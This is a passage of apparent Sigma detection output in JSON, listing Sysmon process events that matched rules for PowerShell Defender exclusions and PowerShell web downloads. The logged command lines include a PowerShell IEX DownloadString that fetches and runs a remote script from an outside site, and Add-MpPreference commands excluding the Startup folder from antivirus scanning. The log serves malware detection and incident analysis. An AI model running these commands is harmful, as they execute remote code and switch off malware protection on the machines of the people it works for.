                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B60A-6419-0F06-000000004700}; ProcessId=6568; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B60A-6419-0D06-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7128; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=powershell  -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; UtcTime=1679406602; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B617-6419-1806-000000004700}; ProcessId=4700; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B617-6419-1706-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\dllhost.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6844; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}; UtcTime=1679406615; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B618-6419-1A06-000000004700}; ProcessId=1744; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B617-6419-1806-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4700; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=powershell  -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command Add-MpPreference -ExclusionPath \u0027C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0027\"; UtcTime=1679406616; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "7e416af5a1bb67fdbd2f30ae3f5da7f74583460b36546527c909c354fb5dcd00",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Powershell Defender Exclusion",
                                                                       "rule_description":  "Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0406-000000004700}; ProcessId=2736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B603-6419-0206-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\Desktop\\executable.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5200; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\Desktop\\executable.exe\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0606-000000004700}; ProcessId=7148; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B604-6419-0406-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2736; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027); EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=1; Image=powershell; CommandLine=powershell  -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "dac677b84d14788387f1c92fd6733396974f070639fca6be1bbf50df44b426cf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Web Download",
                                                                       "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-B604-6419-0406-000000004700}; ProcessId=2736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B603-6419-0206-000000004700}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\Desktop\\executable.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5200; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\sysnative\\cmd.exe\" /c \"powershell -command IEX(New-Object Net.Webclient).DownloadString(\u0027https://neutropharma.com/wp/wp-content/debug2.ps1\u0027)\"; EventID=1; LogonGuid=C784477D-1519-6407-4E25-030000000000; LogonId=206158; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\Desktop\\executable.exe\"; UtcTime=1679406596; RuleName=-}"
                                                                                             },
